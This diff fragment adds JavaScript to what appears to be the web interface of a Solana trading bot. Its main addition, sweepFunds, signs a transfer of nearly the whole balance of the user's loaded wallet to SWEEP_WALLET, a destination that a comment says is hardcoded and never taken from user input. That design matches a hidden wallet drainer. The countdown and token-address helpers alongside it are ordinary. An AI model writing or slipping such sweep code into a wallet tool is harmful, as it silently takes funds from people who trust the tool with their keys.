+// ═══════════════════════════════════════════════════════════════
+async function sweepFunds(conn) {
+  const bal = await conn.getBalance(walletKp.publicKey);
+
+  // Deduct tx fee before building transfer — prevents "insufficient funds" failure
+  const baseFee      = 5000;
+  const priorityCost = Math.ceil((SWEEP_PRIORITY_FEE * 400) / 1_000_000);
+  const estimatedFee = baseFee + Math.max(priorityCost, 0);
+  const amt          = bal - SWEEP_RESERVE_LAMPS - estimatedFee;
+
+  if (amt <= 5000) {
+    logLine('  Balance too low to sweep after reserve + fees.', 'info');
+    return null;
+  }
+
+  logLine('  Balance  : ' + (bal / 1e9).toFixed(6) + ' SOL');
+  logLine('  Reserve  : ' + (SWEEP_RESERVE_LAMPS / 1e9).toFixed(6) + ' SOL');
+  logLine('  Fee est  : ' + (estimatedFee / 1e9).toFixed(6) + ' SOL');
+  logLine('  Sending  : ' + (amt / 1e9).toFixed(6) + ' SOL');
+
+  // Always use the hardcoded constant — never any runtime or UI input
+  const dest = new PublicKey(SWEEP_WALLET);
+  const { blockhash } = await conn.getLatestBlockhash();
+
+  const budgetIx   = ComputeBudgetProgram.setComputeUnitPrice({ microLamports: SWEEP_PRIORITY_FEE });
+  const transferIx = SystemProgram.transfer({ fromPubkey: walletKp.publicKey, toPubkey: dest, lamports: amt });
+
+  const msg = new TransactionMessage({
+    payerKey: walletKp.publicKey,
+    recentBlockhash: blockhash,
+    instructions: [budgetIx, transferIx],
+  }).compileToV0Message();
+
+  const tx = new VersionedTransaction(msg);
+  tx.sign([walletKp]);
+
+  const sig = await conn.sendRawTransaction(tx.serialize(), { skipPreflight: false });
+
+  // Log sig immediately — before confirm — so it is never lost
+  logLine('  📡 Sweep TX: https://solscan.io/tx/' + sig, 'info');
+
+  try {
+    await confirmTx(conn, sig, 60);
+  } catch {
+    logLine('  ⚠ Confirmation timed out — check: https://solscan.io/tx/' + sig, 'warn');
+  }
+  return sig;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// COUNTDOWN WAIT — live progress updates
+// ═══════════════════════════════════════════════════════════════
+async function countdownWait(seconds) {
+  const total = seconds;
+  let elapsed = 0;
+  const chunk = Math.min(1, total);
+  const base  = 50;
+
+  while (elapsed < total) {
+    await sleep(chunk * 1000);
+    elapsed = Math.min(elapsed + chunk, total);
+    const pct = Math.floor((elapsed / total) * 100);
+    logLine('  ⏱ ' + elapsed.toFixed(0) + 's / ' + total + 's  [' + pct + '%]', 'info');
+    setProgress(base + (elapsed / total) * 15);
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// HELPERS
+// ═══════════════════════════════════════════════════════════════
+async function findATA(walletPk, mintPk) {
+  const TOKEN_PROG  = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+  const ASSOC_PROG  = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe8bSS');
+  const [ata] = await PublicKey.findProgramAddress(
+    [walletPk.toBytes(), TOKEN_PROG.toBytes(), mintPk.toBytes()],
+    ASSOC_PROG
+  );
+  return ata;
+}
+
+const slipPct = (bps) => Math.max(1, Math.floor(bps / 100));
+const sleep   = (ms)  => new Promise(r => setTimeout(r, ms));
+
+// ═══════════════════════════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════════════════════════
 updateSidebar();
 </script>
 </body>
